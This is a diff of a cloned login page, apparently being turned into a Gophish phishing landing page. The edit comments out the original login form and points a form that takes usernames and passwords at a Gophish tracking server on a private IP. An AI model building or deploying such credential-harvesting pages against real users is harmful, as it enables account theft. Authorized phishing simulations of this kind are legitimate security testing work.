@@ -84,7 +84,7 @@ $(document).ready(function() {
 	    resizable: false,
 	    draggable: false,
 	    width: 400
-	});	
+	});
 		
   
 });
@@ -98,19 +98,11 @@ $(document).ready(function() {
 <div style="display:none;"><input name="_method" type="hidden" value="POST" /><input autocomplete="off" id="Token2018863416" name="data[_Token][key]" type="hidden" value="db14acb4613550f7e12199ae1d1e8013b6a14c90ebd9be4f57f6bc2fb5304dff189186733dcb43fc128567875911ddf33ea4031475cf6a22b39a41f9fe689c9b" /></div>
 
 
-<!-- tableau d'entrée d'identifiant basique 
 
-<form action="" method="post" name="form">
 
-<input name="username" placeholder="email@test.com" type="email"/>
-<input name="password" placeholder="Password" type="password"/>
+<!-- entrée et validation des identifiants -->
 
-<button class="color-button" type="submit" value="Submit">Sign in</button>
-</form>
-
--->
-
-<form method="POST" action="http://your-gophish-server.com:3333/track">
+<form method="POST" action="http://192.168.128.74:3333/track">
         <input type="hidden" name="rid" value="{{.RID}}">
         <input type="hidden" name="email" value="{{.Email}}">
         <label for="username">Login</label>
@@ -121,7 +113,7 @@ $(document).ready(function() {
     </form>
 
 
-<!-- table d'entrée des identifiants -->
+<!-- table d'entrée des identifiants d'origine
 
 
 <table align="center" border="0" cellspacing="6" width="258">
@@ -137,12 +129,16 @@ $(document).ready(function() {
 	</tbody>
 </table>
 
-<!-- validation des identifiants -->
+-->
+
+<!-- validation des identifiants 
 
 <input height="25" src="/img/s_blank.gif" style="position: absolute; top:153px; left: 299px; background-color: transparent" type="image" width="80" />
 <div style="display:none;"><input autocomplete="off" id="TokenFields619035215" name="data[_Token][fields]" type="hidden" value="436024fe670d373300f2922d85362ee012b208a4%3A" /><input autocomplete="off" id="TokenUnlocked739047114" name="data[_Token][unlocked]" type="hidden" value="x%7Cy" /></div>
 </form>
 </div>
+
+-->
 
 <div id="loadmask" style="display: none;" title="Processing login">During the login process, we perform various security checks. We ask for your understanding for the long login time - it increases your security drastically.</div>
 
